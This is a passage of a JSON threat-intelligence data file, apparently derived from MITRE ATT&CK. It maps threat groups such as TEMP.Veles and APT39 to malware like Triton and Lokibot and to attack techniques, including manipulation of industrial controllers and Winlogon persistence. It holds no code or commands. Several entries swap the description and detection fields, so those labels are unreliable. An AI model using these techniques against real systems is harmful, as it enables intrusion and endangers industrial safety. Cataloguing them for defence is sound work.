                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1055": "Process Injection",
                    "T1049": "System Network Connections Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1010": "Application Window Discovery"
                }
            },
            "val": 44
        },
        {
            "id": "G0088",
            "type": "group",
            "attributes": {
                "val": 3,
                "name": "TEMP.Veles",
                "aliases": [
                    "XENOTIME"
                ],
                "description": "TEMP.Veles is a Russia-based threat group that has targeted critical infrastructure. The group has been observed utilizing TRITON, a malware framework designed to manipulate industrial safety systems.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0029": "PsExec",
                    "S0002": "Mimikatz",
                    "S1009": "Triton"
                },
                "techniques": {
                    "T1583.003": "Virtual Private Server",
                    "T1027.005": "Indicator Removal from Tools",
                    "T1571": "Non-Standard Port",
                    "T1074.001": "Local Data Staging",
                    "T1059.001": "PowerShell",
                    "T1003.001": "LSASS Memory",
                    "T1021.004": "SSH",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1070.006": "Timestomp",
                    "T1070.004": "File Deletion",
                    "T1546.012": "Image File Execution Options Injection",
                    "T1505.003": "Web Shell",
                    "T1053.005": "Scheduled Task",
                    "T1133": "External Remote Services",
                    "T1078": "Valid Accounts",
                    "T1065": "Uncommonly Used Port",
                    "T1043": "Commonly Used Port",
                    "T1311": "Dynamic DNS",
                    "T1329": "Acquire and/or use 3rd party infrastructure services",
                    "T0886": "Remote Services",
                    "T0822": "External Remote Services",
                    "T0862": "Supply Chain Compromise",
                    "T0859": "Valid Accounts",
                    "T0817": "Drive-by Compromise"
                }
            }
        },
        {
            "id": "T0834",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Native API",
                "chain_phase": "execution-ics",
                "description": [],
                "detection": "Adversaries may directly interact with the native OS application programming interface (API) to access system functions. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations. Functionality provided by native APIs are often also exposed to user-mode applications via interfaces and libraries. For example, functions such as memcpy and direct operations on memory registers can be used to modify user and system memory space.",
                "is_subtype": false,
                "platforms": [
                    "Control Server",
                    "Data Historian",
                    "Field Controller/RTU/PLC/IED",
                    "Human-Machine Interface",
                    "Input/Output Server",
                    "Safety Instrumented System/Protection Relay"
                ]
            }
        },
        {
            "id": "T0890",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Exploitation for Privilege Escalation",
                "chain_phase": "privilege-escalation-ics",
                "description": [],
                "detection": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions. When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.",
                "is_subtype": false,
                "platforms": [
                    "Human-Machine Interface",
                    "Safety Instrumented System/Protection Relay"
                ]
            }
        },
        {
            "id": "T0821",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Modify Controller Tasking",
                "chain_phase": "execution-ics",
                "description": [],
                "detection": "Adversaries may modify the tasking of a controller to allow for the execution of their own programs. This can allow an adversary to manipulate the execution flow and behavior of a controller. According to 61131-3, the association of a Task with a Program Organization Unit (POU) defines a task association. An adversary may modify these associations or create new ones to manipulate the execution flow of a controller. Modification of controller tasking can be accomplished using a Program Download in addition to other types of program modification such as online edit and program append. Tasks have properties, such as interval, frequency and priority to meet the requirements of program execution. Some controller vendors implement tasks with implicit, pre-defined properties whereas others allow for these properties to be formulated explicitly. An adversary may associate their program with tasks that have a higher priority or execute associated programs more frequently. For instance, to ensure cyclic execution of their program on a Siemens controller, an adversary may add their program to the “task”, Organization Block 1 (OB1).",
                "is_subtype": false,
                "platforms": [
                    "Field Controller/RTU/PLC/IED"
                ]
            }
        },
        {
            "id": "T0885",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Commonly Used Port",
                "chain_phase": "command-and-control-ics",
                "description": [],
                "detection": "Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend in with normal network activity, to avoid more detailed inspection. They may use the protocol associated with the port, or a completely different protocol. They may use commonly open ports, such as the examples provided below.\n* TCP:80 (HTTP)\n* TCP:443 (HTTPS)\n* TCP/UDP:53 (DNS)\n* TCP:1024-4999 (OPC on XP/Win2k3)\n* TCP:49152-65535 (OPC on Vista and later)\n* TCP:23 (TELNET)\n* UDP:161 (SNMP)\n* TCP:502 (MODBUS)\n* TCP:102 (S7comm/ISO-TSAP)\n* TCP:20000 (DNP3)\n* TCP:44818 (Ethernet/IP)\n\nContributors: Matan Dobrushin - Otorio",
                "is_subtype": false,
                "platforms": [
                    "Safety Instrumented System/Protection Relay",
                    "Field Controller/RTU/PLC/IED",
                    "Human-Machine Interface",
                    "Control Server",
                    "Engineering Workstation"
                ]
            }
        },
        {
            "id": "T0818",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Engineering Workstation Compromise",
                "chain_phase": "initial-access-ics",
                "description": [],
                "detection": "Adversaries may compromise and gain control of an engineering workstation for Initial Access into the control system environment. Access to an engineering workstation may occur through or physical means, such as a Valid Accounts with privileged access or infection by removable media. A dual-homed engineering workstation may allow the adversary access into multiple networks. For example, unsegregated process control, safety system, or information system networks. An Engineering Workstation is designed as a reliable computing platform that configures, maintains, and diagnoses control system equipment and applications. Compromise of an engineering workstation may provide access to, and control of, other control system applications and equipment. In the Maroochy attack, the adversary utilized a computer, possibly stolen, with proprietary engineering software to communicate with a wastewater system.",
                "is_subtype": false,
                "platforms": [
                    "Engineering Workstation"
                ]
            }
        },
        {
            "id": "T0868",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Detect Operating Mode",
                "chain_phase": "collection-ics",
                "description": [],
                "detection": "Adversaries may gather information about a PLC’s or controller’s current operating mode. Operating modes dictate what change or maintenance functions can be manipulated and are often controlled by a key switch on the PLC (e.g., run, prog program, and remote). Knowledge of these states may be valuable to an adversary to determine if they are able to reprogram the PLC. Operating modes and the mechanisms by which they are selected often vary by vendor and product line. Some commonly implemented operating modes are described below: Program - This mode must be enabled before changes can be made to a device’s program. This allows program uploads and downloads between the device and an engineering workstation. Often the PLC’s logic Is halted, and all outputs may be forced off. Run - Execution of the device’s program occurs in this mode. Input and output (values, points, tags, elements, etc.) are monitored and used according to the program’s logic. Program Upload and Program Download are disabled while in this mode. Remote - Allows for remote changes to a PLC’s operation mode. Stop - The PLC and program is stopped, while in this mode, outputs are forced off. Reset - Conditions on the PLC are reset to their original states. Warm resets may retain some memory while cold resets will reset all I/O and data registers. Test / Monitor mode - Similar to run mode, I/O is processed, although this mode allows for monitoring, force set, resets, and more generally tuning or debugging of the system. Often monitor mode may be used as a trial for initialization.",
                "is_subtype": false,
                "platforms": [
                    "Field Controller/RTU/PLC/IED"
                ]
            }
        },
        {
            "id": "T0871",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Execution through API",
                "chain_phase": "execution-ics",
                "description": [],
                "detection": "Adversaries may attempt to leverage Application Program Interfaces (APIs) used for communication between control software and the hardware. Specific functionality is often coded into APIs which can be called by software to engage specific functions on a device or other software.",
                "is_subtype": false,
                "platforms": [
                    "Field Controller/RTU/PLC/IED"
                ]
            }
        },
        {
            "id": "T0872",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Indicator Removal on Host",
                "chain_phase": "evasion-ics",
                "description": [],
                "detection": "Adversaries may attempt to remove indicators of their presence on a system in an effort to cover their tracks. In cases where an adversary may feel detection is imminent, they may try to overwrite, delete, or cover up changes they have made to the device.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Human-Machine Interface",
                    "Safety Instrumented System/Protection Relay"
                ]
            }
        },
        {
            "id": "T0843",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Program Download",
                "chain_phase": "lateral-movement-ics",
                "description": [],
                "detection": "Adversaries may perform a program download to transfer a user program to a controller. ariations of program download, such as online edit and program append, allow a controller to continue running during the transfer and reconfiguration process without interruption to process control. However, before starting a full program download (i.e., download all) a controller may need to go into a stop state. This can have negative consequences on the physical process, especially if the controller is not able to fulfill a time-sensitive action. Adversaries may choose to avoid a download all in favor of an online edit or program append to avoid disrupting the physical process. An adversary may need to use the technique Detect Operating Mode or Change Operating Mode to make sure the controller is in the proper mode to accept a program download. The granularity of control to transfer a user program in whole or parts is dictated by the management protocol (e.g., S7CommPlus, TriStation) and underlying controller API. Thus, program download is a high-level term for the suite of vendor-specific API calls used to configure a controller’s user program memory space. Modify Controller Tasking and Modify Program represent the configuration changes that are transferred to a controller via a program download.",
                "is_subtype": false,
                "platforms": [
                    "Field Controller/RTU/PLC/IED",
                    "Safety Instrumented System/Protection Relay"
                ]
            }
        },
        {
            "id": "T0857",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "System Firmware",
                "chain_phase": "persistence-ics",
                "description": [],
                "detection": "System firmware on modern assets is often designed with an update feature. Older device firmware may be factory installed and require special reprograming equipment. When available, the firmware update feature enables vendors to remotely patch bugs and perform upgrades. Device firmware updates are often delegated to the user and may be done using a software update package. It may also be possible to perform this task over the network. An adversary may exploit the firmware update feature on accessible devices to upload malicious or out-of-date firmware. Malicious modification of device firmware may provide an adversary with root access to a device, given firmware is one of the lowest programming abstraction layers.",
                "is_subtype": false,
                "platforms": [
                    "Safety Instrumented System/Protection Relay",
                    "Field Controller/RTU/PLC/IED",
                    "Input/Output Server"
                ]
            }
        },
        {
            "id": "T0858",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Change Operating Mode",
                "chain_phase": "execution-ics",
                "description": [],
                "detection": "Adversaries Adversaries may change the operating mode of a controller to gain additional access to engineering functions such as Program Download. Programmable controllers typically have several modes of operation that control the state of the user program and control access to the controller’s API. Operating modes can be physically selected using a key switch on the face of the controller but may also be selected with calls to the controller’s API. Operating modes and the mechanisms by which they are selected often vary by vendor and product line. Some commonly implemented operating modes are described below: Program - This mode must be enabled before changes can be made to a device’s program. This allows program uploads and downloads between the device and an engineering workstation. Often the PLC’s logic Is halted, and all outputs may be forced off. Run - Execution of the device’s program occurs in this mode. Input and output (values, points, tags, elements, etc.) are monitored and used according to the program’s logic. Program Upload and Program Download are disabled while in this mode. Remote - Allows for remote changes to a PLC’s operation mode. Stop - The PLC and program is stopped, while in this mode, outputs are forced off. Reset - Conditions on the PLC are reset to their original states. Warm resets may retain some memory while cold resets will reset all I/O and data registers.Test / Monitor mode - Similar to run mode, I/O is processed, although this mode allows for monitoring, force set, resets, and more generally tuning or debugging of the system. Often monitor mode may be used as a trial for initialization.",
                "is_subtype": false,
                "platforms": [
                    "Safety Instrumented System/Protection Relay",
                    "Field Controller/RTU/PLC/IED"
                ]
            }
        },
        {
            "id": "T0820",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Exploitation for Evasion",
                "chain_phase": "evasion-ics",
                "description": [],
                "detection": "Adversaries may exploit a software vulnerability to take advantage of a programming error in a program, service, or within the operating system software or kernel itself to evade detection. Vulnerabilities may exist in software that can be used to disable or circumvent security features.\n\nAdversaries may have prior knowledge through <span class=\"smw-format list-format \"><span class=\"smw-row\"><span class=\"smw-field\"><span class=\"smw-value\">Control Device Identification</span></span></span></span> about security features implemented on control devices. These device security features will likely be targeted directly for exploitation. There are examples of firmware RAM/ROM consistency checks on control devices being targeted by adversaries to enable the installation of malicious System Firmware",
                "is_subtype": false,
                "platforms": [
                    "Safety Instrumented System/Protection Relay",
                    "Field Controller/RTU/PLC/IED"
                ]
            }
        },
        {
            "id": "T0880",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Loss of Safety",
                "chain_phase": "impact-ics",
                "description": [],
                "detection": "Adversaries may compromise safety system functions designed to maintain safe operation of a process when unacceptable or dangerous conditions occur. Safety systems are often composed of the same elements as control systems but have the sole purpose of ensuring the process fails in a predetermined safe manner. Many unsafe conditions in process control happen too quickly for a human operator to react to. Speed is critical in correcting these conditions to limit serious impacts such as Loss of Control and Property Damage. Adversaries may target and disable safety system functions as a prerequisite to subsequent attack execution or to allow for future unsafe conditionals to go unchecked. Detection of a Loss of Safety by operators can result in the shutdown of a process due to strict policies regarding safety systems. This can cause a Loss of Productivity and Revenue and may meet the technical goals of adversaries seeking to cause process disruptions.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T0846",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Remote System Discovery",
                "chain_phase": "discovery-ics",
                "description": [],
                "detection": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for subsequent Lateral Movement or Discovery techniques. Functionality could exist within adversary tools to enable this, but utilities available on the operating system or vendor software could also be used.",
                "is_subtype": false,
                "platforms": [
                    "Control Server",
                    "Data Historian",
                    "Safety Instrumented System/Protection Relay",
                    "Field Controller/RTU/PLC/IED",
                    "Human-Machine Interface"
                ]
            }
        },
        {
            "id": "T0855",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Unauthorized Command Message",
                "chain_phase": "impair-process-control",
                "description": [],
                "detection": "Adversaries may send unauthorized command messages to instruct control system assets to perform actions outside of their intended functionality, or without the logical preconditions to trigger their expected function. Command messages are used in ICS networks to give direct instructions to control systems devices. If an adversary can send an unauthorized command message to a control system, then it can instruct the control systems device to perform an action outside the normal bounds of the device's actions. An adversary could potentially instruct a control systems device to perform an action that will cause an Impact. In the Maroochy Attack, the adversary used a dedicated analog two-way radio system to send false data and instructions to pumping stations and the central computer. In the Dallas Siren incident, adversaries were able to send command messages to activate tornado alarm systems across the city without an impending tornado or other disaster. Alarms were activated more than a dozen times. These disruptions occurred once in 2017, and later in a nearby county in 2019.",
                "is_subtype": false,
                "platforms": [
                    "Field Controller/RTU/PLC/IED"
                ]
            }
        },
        {
            "id": "S1009",
            "type": "tool",
            "attributes": {
                "name": "Triton",
                "aliases": [
                    "TRISIS",
                    "HatMan"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Triton is an attack framework built to interact with Triconex Safety Instrumented System (SIS) controllers.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T0834": "Native API",
                    "T0890": "Exploitation for Privilege Escalation",
                    "T0821": "Modify Controller Tasking",
                    "T0885": "Commonly Used Port",
                    "T0818": "Engineering Workstation Compromise",
                    "T0853": "Scripting",
                    "T0868": "Detect Operating Mode",
                    "T0871": "Execution through API",
                    "T0872": "Indicator Removal on Host",
                    "T0843": "Program Download",
                    "T0857": "System Firmware",
                    "T0858": "Change Operating Mode",
                    "T0820": "Exploitation for Evasion",
                    "T0880": "Loss of Safety",
                    "T0846": "Remote System Discovery",
                    "T0849": "Masquerading",
                    "T0855": "Unauthorized Command Message"
                }
            },
            "val": 17
        },
        {
            "id": "G0087",
            "type": "group",
            "attributes": {
                "val": 11,
                "name": "APT39",
                "aliases": [
                    "REMIX KITTEN",
                    "ITG07",
                    "Chafer"
                ],
                "description": "APT39 is one of several names for cyberespionage activity conducted by the Iranian Ministry of Intelligence and Security (MOIS) through the front company Rana Intelligence Computing since at least 2014. APT39 has primarily targeted the travel, hospitality, academic, and telecommunications industries in Iran and across Asia, Africa, Europe, and North America to track individuals and entities considered to be a threat by the MOIS.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0590": "NBTscan",
                    "S0488": "CrackMapExec",
                    "S0459": "MechaFlounder",
                    "S0454": "Cadelspy",
                    "S0375": "Remexi",
                    "S0095": "FTP",
                    "S0073": "ASPXSpy",
                    "S0029": "PsExec",
                    "S0006": "pwdump",
                    "S0005": "Windows Credential Editor",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1553.006": "Code Signing Policy Modification",
                    "T1071.004": "DNS",
                    "T1071.001": "Web Protocols",
                    "T1090.002": "External Proxy",
                    "T1090.001": "Internal Proxy",
                    "T1102.002": "Bidirectional Communication",
                    "T1074.001": "Local Data Staging",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1569.002": "Service Execution",
                    "T1059.006": "Python",
                    "T1059.005": "Visual Basic",
                    "T1059.001": "PowerShell",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1560.001": "Archive via Utility",
                    "T1056.001": "Keylogging",
                    "T1555": "Credentials from Password Stores",
                    "T1003.001": "LSASS Memory",
                    "T1021.004": "SSH",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1027.002": "Software Packing",
                    "T1070.004": "File Deletion",
                    "T1136.001": "Local Account",
                    "T1547.009": "Shortcut Modification",
                    "T1546.010": "AppInit DLLs",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1505.003": "Web Shell",
                    "T1053.005": "Scheduled Task",
                    "T1190": "Exploit Public-Facing Application",
                    "T1197": "BITS Jobs",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1135": "Network Share Discovery",
                    "T1115": "Clipboard Data",
                    "T1113": "Screen Capture",
                    "T1110": "Brute Force",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1078": "Valid Accounts",
                    "T1059": "Command and Scripting Interpreter",
                    "T1056": "Input Capture",
                    "T1046": "Network Service Scanning",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1018": "Remote System Discovery",
                    "T1012": "Query Registry",
                    "T1005": "Data from Local System",
                    "T1003": "OS Credential Dumping"
                }
            }
        },
        {
            "id": "T1110.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Password Spraying",
                "chain_phase": "credential-access",
                "description": "Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). Specifically, monitor for many failed authentication attempts across various accounts that may result from password spraying attempts.\n\nConsider the following event IDs:(Citation: Trimarc Detecting Password Spraying)\n\n* Domain Controllers: \"Audit Logon\" (Success & Failure) for event ID 4625.\n* Domain Controllers: \"Audit Kerberos Authentication Service\" (Success & Failure) for event ID 4771.\n* All systems: \"Audit Logon\" (Success & Failure) for event ID 4648.",
                "detection": "Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. \n\nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace",
                    "Containers"
                ]
            }
        },
        {
            "id": "S0488",
            "type": "tool",
            "attributes": {
                "name": "CrackMapExec",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "CrackMapExec, or CME, is a post-exploitation tool developed in Python and designed for penetration testing against networks. CrackMapExec collects Active Directory information to conduct lateral movement through targeted networks.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.001": "PowerShell",
                    "T1069.002": "Domain Groups",
                    "T1087.002": "Domain Account",
                    "T1003.004": "LSA Secrets",
                    "T1003.003": "NTDS",
                    "T1003.002": "Security Account Manager",
                    "T1110.003": "Password Spraying",
                    "T1110.001": "Password Guessing",
                    "T1550.002": "Pass the Hash",
                    "T1053.002": "At (Windows)",
                    "T1201": "Password Policy Discovery",
                    "T1135": "Network Share Discovery",
                    "T1112": "Modify Registry",
                    "T1110": "Brute Force",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 20
        },
        {
            "id": "S0459",
            "type": "tool",
            "attributes": {
                "name": "MechaFlounder",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "MechaFlounder is a python-based remote access tool (RAT) that has been used by APT39. The payload uses a combination of actor developed code and code snippets freely available online in development communities.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1059.006": "Python",
                    "T1059.003": "Windows Command Shell",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1105": "Ingress Tool Transfer",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery"
                }
            },
            "val": 8
        },
        {
            "id": "S0454",
            "type": "tool",
            "attributes": {
                "name": "Cadelspy",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Cadelspy is a backdoor that has been used by APT39.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1560": "Archive Collected Data",
                    "T1056.001": "Keylogging",
                    "T1123": "Audio Capture",
                    "T1120": "Peripheral Device Discovery",
                    "T1115": "Clipboard Data",
                    "T1113": "Screen Capture",
                    "T1082": "System Information Discovery",
                    "T1010": "Application Window Discovery"
                }
            },
            "val": 8
        },
        {
            "id": "T1547.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Winlogon Helper DLL",
                "chain_phase": "persistence",
                "description": "Monitor for changes to Registry entries associated with Winlogon that do not correlate with known software, patch cycles, etc. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current Winlogon helper values. (Citation: TechNet Autoruns)  New DLLs written to System32 that do not correlate with known good software or patching may also be suspicious.\n\nLook for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
                "detection": "Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software\\\\Wow6432Node\\\\\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper programs and functionalities that support Winlogon.  \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: \n\n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0375",
            "type": "tool",
            "attributes": {
                "name": "Remexi",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Remexi is a Windows-based Trojan that was developed in the C programming language.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1560": "Archive Collected Data",
                    "T1056.001": "Keylogging",
                    "T1547.004": "Winlogon Helper DLL",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1053.005": "Scheduled Task",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1115": "Clipboard Data",
                    "T1113": "Screen Capture",
                    "T1083": "File and Directory Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1027": "Obfuscated Files or Information",
                    "T1010": "Application Window Discovery"
                }
            },
            "val": 16
        },
        {
            "id": "G0086",
            "type": "group",
            "attributes": {
                "val": 2,
                "name": "Stolen Pencil",
                "aliases": [],
                "description": "Stolen Pencil is a threat group likely originating from DPRK that has been active since at least May 2018. The group appears to have targeted academic institutions, but its motives remain unclear.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0029": "PsExec",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1078.003": "Local Accounts",
                    "T1566.002": "Spearphishing Link",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1056.001": "Keylogging",
                    "T1003.001": "LSASS Memory",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1552.001": "Credentials In Files",
                    "T1176": "Browser Extensions",
                    "T1040": "Network Sniffing"
                }
            }
        },
        {
            "id": "G0085",
            "type": "group",
            "attributes": {
                "val": 0,
                "name": "FIN4",
                "aliases": [],
                "description": "FIN4 is a financially-motivated threat group that has targeted confidential information related to the public financial market, particularly regarding healthcare and pharmaceutical companies, since at least 2013. FIN4 is unique in that they do not infect victims with typical persistent malware, but rather they focus on capturing credentials authorized to access email and other non-public correspondence.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": [],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1090.003": "Multi-hop Proxy",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1059.005": "Visual Basic",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1565.001": "Stored Data Manipulation",
                    "T1114.002": "Remote Email Collection",
                    "T1056.002": "GUI Input Capture",
                    "T1056.001": "Keylogging",
                    "T1078": "Valid Accounts"
                }
            }
        },
        {
            "id": "G0084",
            "type": "group",
            "attributes": {
                "val": 0,
                "name": "Gallmaker",
                "aliases": [],
                "description": "Gallmaker is a cyberespionage group that has targeted victims in the Middle East and has been active since at least December 2017. The group has mainly targeted victims in the defense, military, and government sectors.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": [],
                "techniques": {
                    "T1204.002": "Malicious File",
                    "T1059.001": "PowerShell",
                    "T1566.001": "Spearphishing Attachment",
                    "T1560.001": "Archive via Utility",
                    "T1559.002": "Dynamic Data Exchange",
                    "T1027": "Obfuscated Files or Information"
                }
            }
        },
        {
            "id": "G0083",
            "type": "group",
            "attributes": {
                "val": 5,
                "name": "SilverTerrier",
                "aliases": [],
                "description": "SilverTerrier is a Nigerian threat group that has been seen active since 2014. SilverTerrier mainly targets organizations in high technology, higher education, and manufacturing.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0447": "Lokibot",
                    "S0336": "NanoCore",
                    "S0334": "DarkComet",
                    "S0331": "Agent Tesla",
                    "S0198": "NETWIRE"
                },
                "techniques": {
                    "T1071.003": "Mail Protocols",
                    "T1071.002": "File Transfer Protocols",
                    "T1071.001": "Web Protocols"
                }
            }
        },
        {
            "id": "S0447",
            "type": "tool",
            "attributes": {
                "name": "Lokibot",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Lokibot is a malware designed to collect credentials and security tokens from an infected machine. Lokibot has also been used to establish backdoors in enterprise environments.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1204.002": "Malicious File",
                    "T1564.001": "Hidden Files and Directories",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1056.001": "Keylogging",
                    "T1555": "Credentials from Password Stores",
                    "T1027.002": "Software Packing",
                    "T1055.012": "Process Hollowing",
                    "T1082": "System Information Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 13
        },
        {
            "id": "S0336",
            "type": "tool",
            "attributes": {
                "name": "NanoCore",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "NanoCore is a modular remote access tool developed in .NET that can be used to spy on victims and steal information. It has been used by threat actors since 2013.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1562.004": "Disable or Modify System Firewall",
                    "T1562.001": "Disable or Modify Tools",
                    "T1056.001": "Keylogging",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1125": "Video Capture",
                    "T1123": "Audio Capture",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1065": "Uncommonly Used Port",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 14
        },
        {
            "id": "S0334",
            "type": "tool",
            "attributes": {
                "name": "DarkComet",
                "aliases": [
                    "DarkKomet",
                    "Fynloski",
                    "Krademok",
                    "FYNLOS"
                ],
                "labels": [
                    "malware"
                ],
